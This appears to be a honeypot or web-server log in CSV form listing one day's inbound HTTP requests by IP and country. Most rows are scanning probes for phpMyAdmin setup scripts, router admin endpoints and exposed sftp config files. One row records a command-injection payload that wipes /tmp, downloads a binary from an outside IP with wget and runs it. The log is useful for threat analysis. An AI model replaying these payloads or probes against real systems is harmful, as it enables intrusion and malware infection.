"2025-07-19","196.251.80.54","Seychelles","HTTP","/boaform/admin/formLogin"
"2025-07-19","8.210.37.176","Hong Kong","HTTP","http://108.174.54.75:80/SQL/scripts/setup.php"
"2025-07-19","8.210.37.176","Hong Kong","HTTP","http://108.174.54.75:80/PHPMYADMIN/scripts/setup.php"
"2025-07-19","8.210.37.176","Hong Kong","HTTP","http://108.174.54.75:80/phpMyAdmin-2.10.3/scripts/setup.php"
"2025-07-19","8.210.37.176","Hong Kong","HTTP","http://108.174.54.75:80/mysql-admin/scripts/setup.php"
"2025-07-19","8.210.37.176","Hong Kong","HTTP","http://108.174.54.75:80/myadmin/scripts/setup.php"
"2025-07-19","8.210.37.176","Hong Kong","HTTP","http://108.174.54.75:80/phpMyAdmin-2.10.2/scripts/setup.php"
"2025-07-19","8.210.37.176","Hong Kong","HTTP","http://108.174.54.75:80/phpmyadmin/scripts/setup.php"
"2025-07-19","8.210.37.176","Hong Kong","HTTP","http://108.174.54.75:80/phpMyAdmin-2.11.1.2/scripts/setup.php"
"2025-07-19","8.210.37.176","Hong Kong","HTTP","http://108.174.54.75:80/phpMyAdmin/scripts/setup.php"
"2025-07-19","8.210.37.176","Hong Kong","HTTP","http://108.174.54.75:80/mysql/scripts/setup.php"
"2025-07-19","87.121.84.157","United States","HTTP","/HNAP1/"
"2025-07-19","45.135.193.2","The Netherlands","HTTP","/login"
"2025-07-19","66.63.179.126","United States","HTTP","/shell?cd+/tmp;rm+-rf+*;wget+38.57.46.116/jaws;sh+/tmp/jaws"
"2025-07-19","87.121.84.130","United States","HTTP","/SDK/webLanguage"
"2025-07-19","204.76.203.193","The Netherlands","HTTP","http://ip-api.com/json/"
"2025-07-19","80.88.90.125","Italy","HTTP","/sftp.json"
"2025-07-19","80.88.90.125","Italy","HTTP","/sftp-config.json"
"2025-07-19","80.88.90.125","Italy","HTTP","/.vscode/sftp.json"
"2025-07-19","80.88.90.125","Italy","HTTP","/.vscode/ftp-sync.json"
"2025-07-19","167.99.188.160","Canada","HTTP","/form.html"
"2025-07-19","167.99.188.160","Canada","HTTP","/upl.php"
"2025-07-19","167.99.188.160","Canada","HTTP","/t4"
"2025-07-19","167.99.188.160","Canada","HTTP","/geoip/"
"2025-07-19","167.99.188.160","Canada","HTTP","/favicon.ico"
"2025-07-19","167.99.188.160","Canada","HTTP","/1.php"
"2025-07-19","167.99.188.160","Canada","HTTP","/systembc/password.php"
"2025-07-19","167.99.188.160","Canada","HTTP","/password.php"
"2025-07-19","87.255.194.135","Kazakhstan","HTTP","/admin/configs.php"
"2025-07-19","194.50.16.252","The Netherlands","HTTP","/_ignition/health-check"
"2025-07-19","194.50.16.252","The Netherlands","HTTP","/_ignition/health-check"
"2025-07-19","79.124.58.198","Bulgaria","HTTP","/?XDEBUG_SESSION_START=phpstorm"
"2025-07-19","149.50.96.5","Poland","HTTP","/dispatch.asp"
"2025-07-19","79.124.58.198","Bulgaria","HTTP","/actuator/gateway/routes"
"2025-07-19","204.76.203.233","The Netherlands","HTTP","http://ipv4.icanhazip.com/"
"2025-07-19","152.32.190.31","Hong Kong","HTTP","/v1/vector/collections/describe"
"2025-07-19","152.32.190.31","Hong Kong","HTTP","/v1"
"2025-07-19","45.135.193.2","The Netherlands","HTTP","/goform/set_LimitClient_cfg"
"2025-07-19","45.135.194.11","The Netherlands","HTTP","/UD/act?1"
"2025-07-19","45.135.194.11","The Netherlands","HTTP","/UD/act?1"
"2025-07-19","40.80.204.149","United States","HTTP","/hudson"
